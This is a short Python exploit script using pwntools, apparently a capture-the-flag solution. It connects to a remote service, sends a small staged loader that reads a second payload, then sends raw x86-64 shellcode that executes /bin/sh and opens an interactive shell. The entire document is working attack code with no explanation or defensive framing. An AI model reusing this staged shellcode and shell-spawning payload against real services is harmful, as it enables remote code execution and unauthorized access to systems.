#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
host = "10.211.55.13"
port = 8888
host = "13.112.180.65"
port = 8361
r = remote(host,port)
context.arch = "amd64"
sc = asm("""
s:
    syscall
    xchg   edx,eax
    pop rax
    push rcx
    pop rsi
    jmp s
""")

r.recvuntil(":")
r.send(sc)
time.sleep(0.5)
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

r.sendline(sc)
r.interactive()
